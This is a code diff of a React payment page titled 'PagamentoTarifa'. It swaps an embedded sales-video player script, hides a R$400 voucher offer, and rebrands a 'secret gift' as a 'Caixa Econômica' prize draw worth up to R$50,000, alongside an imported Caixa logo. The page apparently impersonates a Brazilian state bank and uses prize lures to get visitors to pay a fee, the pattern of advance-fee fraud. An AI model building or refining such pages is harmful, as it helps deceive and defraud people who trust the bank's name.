@@ -8,7 +8,7 @@ import { Helmet } from "react-helmet";
 import { UserData } from "../types/userData";
 import cartao from "../assets/cartao.png"
 import box from "../assets/box.png"
-import carrinho from "../assets/carrinho.png"
+// import carrinho from "../assets/carrinho.png"
 import logocaixa from "../assets/caixalogo.png"
 import flogo from "../assets/f-logo.png"
 import { BiDownArrowAlt } from "react-icons/bi";
@@ -113,9 +113,9 @@ export function PagamentoTarifa() {
                 <span className="text-xl">ASSISTA O VÍDEO PARA ENTENDER</span>
 
                 <div className="w-full  py-4">
-                    <div dangerouslySetInnerHTML={{ __html: '<div id="vid_6729775144401b000c1505ec" style="position:relative;width:100%;padding: 56.25% 0 0;"> <img id="thumb_6729775144401b000c1505ec" src="https://images.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/6729775144401b000c1505ec/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;"> <div id="backdrop_6729775144401b000c1505ec" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div> </div>' }} />
+                    <div dangerouslySetInnerHTML={{ __html: '<div id="vid_673b937b7c9d41000b963f82" style="position: relative; width: 100%; padding: 56.25% 0 0;"> <img id="thumb_673b937b7c9d41000b963f82" src="https://images.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b937b7c9d41000b963f82/thumbnail.jpg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;" alt="thumbnail"> <div id="backdrop_673b937b7c9d41000b963f82" style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; "></div> </div>' }} />
                     <Helmet>
-                        <script type="text/javascript" id="scr_6729775144401b000c1505ec"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/e5cc2817-09a8-45cb-a70b-789a99211f8a/players/6729775144401b000c1505ec/player.js", s.async=!0,document.head.appendChild(s); </script>
+                        <script type="text/javascript" id="scr_673b937b7c9d41000b963f82"> var s=document.createElement("script"); s.src="https://scripts.converteai.net/19e779a9-9bff-4dff-b541-9918122b88f8/players/673b937b7c9d41000b963f82/player.js", s.async=!0,document.head.appendChild(s); </script>
                     </Helmet>
                 </div>
 
@@ -180,7 +180,7 @@ export function PagamentoTarifa() {
                     <div className="bg-orange-500 p-2 rounded-full w-fit">
                         <img width={20} src={flogo} alt="" />
                     </div>
-                    <h2 className="text-3xl text-orange-500 font-semibold">+ Brindes:</h2>
+                    <h2 className="text-3xl text-zinc-700 font-semibold">+ Brindes:</h2>
                 </div>
 
                 <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
@@ -191,18 +191,18 @@ export function PagamentoTarifa() {
                     </div>
                 </div>
 
-                <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
+                {/* <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
                     <img src={carrinho} alt="cartao" width={130} />
                     <div className="flex flex-col justify-normal">
                         <h3 className="font-semibold  text-xl text-zinc-700">+ Vale compra de <span className="text-yellow-600">R$400</span></h3>
                         <span>Válido em todos os mercados</span>
                     </div>
-                </div>
+                </div> */}
 
                 <div className="flex space-x-2 w-full p-2 bg-zinc-100 rounded-lg">
                     <img src={box} alt="cartao" width={130} />
                     <div className="flex flex-col justify-normal">
-                        <h3 className="font-semibold  text-xl text-zinc-700">+ Presente <span className="text-yellow-600">Secreto</span></h3>
+                        <h3 className="font-semibold  text-xl text-zinc-700">+ Sorteio <span className="text-yellow-600">Caixa Econômica</span></h3>
                         <span>Até R$50.000 em prêmios</span>
                     </div>
                 </div>
